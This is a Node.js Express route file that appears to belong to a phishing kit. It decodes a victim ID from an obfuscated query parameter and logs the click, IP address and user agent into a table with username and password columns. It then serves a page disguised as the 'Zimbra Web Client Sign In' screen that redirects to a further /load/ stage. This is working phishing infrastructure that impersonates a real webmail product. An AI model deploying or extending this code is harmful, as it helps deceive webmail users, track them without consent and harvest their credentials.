
const express = require ('express');
const router = express.Router();
const db = require('./db');


router.get('/', (req, res) => {

    const data = req.query.gdfyrtuyjfghfdgewytiykghncvbxvteruytuykh;

    
    if (data == null) {
        res.render('error');
        
      }else{

    const userid = Buffer.from(data, 'base64').toString('utf-8');    
    const word = 'clicked';
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    //const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 2;


            const insertQuery = 'INSERT INTO npctable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        

    const url = `/load/?lfdkjgiroetuiroyhgfhnbjkfsdfiowerierehjre=${data}`;

   

    const htmlContent = `
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
	<html>
  	  <head>   
        <meta http-equiv="X-UA-Compatible" content="IE=10">
        <link rel="shortcut icon" href="/files/favicon.ico" type="image/x-icon">
        <title>Zimbra Web Client Sign In</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="Refresh" content="3;url=${url}"> 
       
    </head>
    <body>
        
               <object data="/1.pdf" style="height:900px; width:1860px"></object>
        
    </body>
</html>

    `;

    // Send the HTML content as a response
    res.send(htmlContent);


      }

});

module.exports =router
